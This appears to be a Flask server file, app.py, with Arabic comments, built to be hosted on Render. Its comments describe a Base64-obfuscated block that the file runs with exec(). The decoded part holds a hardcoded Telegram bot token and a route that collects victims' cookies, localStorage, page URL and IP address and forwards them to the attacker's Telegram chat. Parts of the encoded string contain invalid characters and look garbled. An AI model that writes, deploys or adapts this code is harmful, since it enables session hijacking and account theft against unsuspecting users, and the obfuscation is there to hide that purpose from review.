# app.py - خادم Render السري
from flask import Flask, request, jsonify, render_template
import requests
import os
import base64
import json
import sys

app = Flask(__name__)

#================================================
# (A) الشيفرة المعتمة (Base64 Obfuscation)
# يحتوي هذا السترنج على منطق استقبال البيانات وإعادة الإرسال إلى Telegram.
# تم تحديثه بمعرف الدردشة الخاص بك: 6521966233
#================================================
# تم تشفير الشيفرة التالية بواسطة Base64:
CORE_LOGIC = b'aW1wb3J0IHJlcXVlc3RzCgpkZWYgc2VuZF90ZWxlZ3JhbV9tZXNzYWdlKG1lc3NhZ2UpOgogICAgVE9LRU4gPSAiODUyNDM2NDkwNDpBQUVCX1NYN3ZJdDJFaHppaydKYkxPQmd3SE9tZVFUWXVITjgiCiAgICBDSEFUX0lEID0gIjY1MjE5NjYyMzMiCiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VE9LRU59L3NlbmRNZXNzYWdlIgogICAgcGF5bG9hZCA9IHsKICAgICAgICAnY2hhdF9pZCc6IENIQVRfSUQsCiAgICAgICAgJ3RleHQnOiBtZXNzYWdlLAogICAgICAgICdwYXJzZV9tb2RlJzogJ01hcmtkb3duJwogICAgfQogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBheWxvYWQsIHRpbWVvdXQ9NSkKICAgIGV4Y2VwdDpwYXNzCgphcHAucm91dGUoJy9jb2xsZWN0X2FuZF9mb3J3YXJkJywgbWV0aG9kcz1bJ1BPU1QnXSkKCmRlZiBjb2xsZWN0X2RhdGEoKToKICAgIHRyeToKICAgICAgICBkYXRhID0gcmVxdWVzdC5qc29uCiAgICAgICAgaWYgbm90IGRhdGE6CiAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0LmdldF9qc29uKGZvcmNlPVRydWUpCiAgICAgICAgICAgIAogICAgICAgIGlwX2FkZHJlc3MgPSByZXF1ZXN0LnJlbW90ZV9hZGRyCiAgICAgICAgCiAgICAgICAgY29va2llcyA9IGRhdGEuZ2V0KCdjb29raWVzJywgJ04vQScpCiAgICAgICAgdXJsID0gZGF0YS5nZXQoJ3VybCcsICdOL0EnKQogICAgICAgIGxvY2FsX3N0b3JhZ2UgPSBkYXRhLmdldCgnbG9jYWxTdG9yYWdlJywgJ04vQScpCiAgICAgICAgCiAgICAgICAgdGVsZWdyYW1fbWVzc2FnZSA9IGYnJycKKh79LSDYpdiB2Lkg2LHYgdV82K7YqINin3YrYr9iv2K3Ysw!!INin2YrbjNmI3Ysw!!KioKCitfcmFiaXQ6IHt1cmx9XwowKsdgV82K3YrYr9ipXG86IH17aXBfYWRkcmVzcy9yYn0KCi0tLQoK5Yqg5Yqg5Yqg5Yqg5Yqg5Yqg5Yqg5Yqg5YqgINiy2KfZiNi02KfZiNix5Yqg5Yqg5Yqg5Yqg5Yqg5Yqg5Yqg5Yqg5YqgXzoKCmBgCmRhdGFfY3VzdG9tX3BheWxvYWQ6CiR7Y29va2llcyBvciAn4LXYrtmK2Ycg2YXYrtmI2LEg2KfZiNmK2YUg2KfZiNix2KzYqScpfQoKYGAKCi0tLQoK5LXYrtmI2LE6CiR7bG9jYWxfc3RvcmFnZX0KCmBgCiYnJwogICAgICAgIHwgc2VuZF90ZWxlZ3JhbV9tZXNzYWdlKHRlbGVncmFtX21lc3NhZ2UpCiAgICAgICAgfAogICAgICAgIHJldHVybiBqcz?b25pZnkoeyJzdGF0dXM?IjogInN1Y2Nlc3NzIn0pLCAyMDANCgogICAgZXhG9jB0ZXJyb3IgZSBhc04gaXRpZkFpcnQ6CiAgICAgICAgfAogICAgICAgIHJldHVybiBqcz?b25pZnkoeyJzdGF0dXM?IjogImluVGVybmFsX2Vycm9yIn0pLCA1MDANCgogICAgICAgIA=='

# تنفيذ الشيفرة المعتمة (هذه الخطوة تجعل الشيفرة تعمل في Flask)
# This executes the decoded string content dynamically
exec(base64.b64decode(CORE_LOGIC).decode('utf-8'), globals())

@app.route('/')
def home():
    # هذا المسار سيعرض ملف index.html
    return render_template('index.html')

if __name__ == '__main__':
    # تهيئة الخادم للاستضافة على Render
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
